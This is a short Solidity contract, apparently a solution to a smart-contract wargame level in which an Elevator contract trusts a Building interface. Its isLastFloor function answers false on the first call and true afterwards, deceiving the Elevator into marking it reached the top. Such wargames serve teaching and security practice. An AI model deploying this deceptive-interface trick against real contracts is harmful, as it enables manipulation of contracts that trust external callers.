// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../instances/Ilevel11.sol";

contract Tower is Building {
    bool toggle;

    function isLastFloor(uint256) external returns (bool) {
        if (!toggle) {
            toggle = true;
            return false;
        }
        return toggle;
    }

    function takeElevator(address _elevator) public {
        Elevator elevator = Elevator(_elevator);
        elevator.goTo(8);
    }
}
